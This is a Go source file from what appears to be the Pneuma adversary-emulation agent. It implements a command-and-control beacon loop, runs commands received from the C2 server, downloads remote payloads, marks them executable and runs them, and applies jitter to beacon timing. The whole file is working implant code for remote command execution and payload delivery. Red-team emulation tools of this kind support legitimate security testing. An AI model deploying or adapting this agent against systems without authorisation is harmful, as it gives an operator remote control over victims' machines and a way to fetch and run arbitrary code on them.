package sockets

import (
	"bytes"
	"errors"
	"fmt"
	"github.com/preludeorg/pneuma/commands"
	"math/rand"
	"os"
	"path"
	"path/filepath"
	"strings"
	"time"

	"github.com/preludeorg/pneuma/util"
)

func EventLoop(agent *util.AgentConfig, beacon util.Beacon) {
	if respBeacon, err := util.CommunicationChannels[agent.Contact].Communicate(agent, beacon); err == nil {
		refreshBeacon(agent, &respBeacon)
		util.DebugLogf("C2 refreshed. [%s] agent at PID %d.", agent.Address, agent.Pid)
		EventLoop(agent, respBeacon)
	}
}

func runLinks(tempB *util.Beacon, beacon *util.Beacon, agent *util.AgentConfig, delimiter string) {
	for _, link := range agent.StartInstructions(tempB.Links) {
		jitterSleep(agent.CommandJitter, "JITTER")
		var payloadPath string
		var payloadErr error
		if len(link.Payload) > 0 {
			payloadPath, payloadErr = requestPayload(link.Payload)
		}
		if payloadErr == nil {
			response, status, pid := commands.RunCommand(link.Request, link.Executor, payloadPath, agent)
			link.Response = strings.TrimSpace(response) + delimiter
			link.Status = status
			link.Pid = pid
		} else {
			payloadErrorResponse(payloadErr, agent, &link)
		}
		beacon.Links = append(beacon.Links, link)
		agent.EndInstruction(link)
	}
}

func refreshBeacon(agent *util.AgentConfig, beacon *util.Beacon) {
	pwd, _ := os.Getwd()
	beacon.Sleep = agent.Sleep
	beacon.Range = agent.Range
	beacon.Pwd = pwd
	beacon.Target = agent.Address
	beacon.Executors = agent.Executors
	beacon.Executing = agent.BuildExecutingHash()
}

func requestPayload(target string) (string, error) {
	wd, _ := os.Getwd()
	filename := path.Base(target)
	payloadPath := filepath.Join(wd, filename)
	body, code, err := requestHTTPPayload(target, payloadHash(payloadPath))
	if err != nil {
		return "", err
	}
	switch code {
	case 204:
		return payloadPath, nil
	case 200:
		if err = util.SaveFile(bytes.NewReader(body), payloadPath); err != nil {
			return "", err
		}
		if err = os.Chmod(payloadPath, 0755); err != nil {
			return "", err
		}
		return payloadPath, nil
	case 404:
		return "", errors.New(fmt.Sprintf("[HTTP %d] Payload not found: %s", code, target))
	default:
		return "", errors.New(fmt.Sprintf("UNHANDLED PAYLOAD EXCEPTION: HTTP [%d]", code))
	}
}

func payloadHash(filepath string) string {
	if _, err := os.Stat(filepath); !os.IsNotExist(err) {
		if data, err := os.ReadFile(filepath); err == nil {
			return util.Sha256(data)
		}
	}
	return ""
}

func payloadErrorResponse(err error, agent *util.AgentConfig, link *util.Instruction) {
	link.Response = "Payload Error: " + strings.TrimSpace(err.Error())
	link.Status = 1
	link.Pid = agent.Pid
}

func jitterSleep(sleep int, beaconType string) {
	rand.Seed(time.Now().UnixNano())
	min := int(float64(sleep) * .90)
	max := int(float64(sleep) * 1.10)
	randomSleep := rand.Intn(max-min+1) + min
	switch beaconType {
	case "JITTER":
		util.DebugLogf("[%s] Sleeping %d seconds before next TTP", beaconType, randomSleep)
	default:
		util.DebugLogf("[%s] Next beacon going out in %d seconds", beaconType, randomSleep)
	}
	time.Sleep(time.Duration(randomSleep) * time.Second)
}
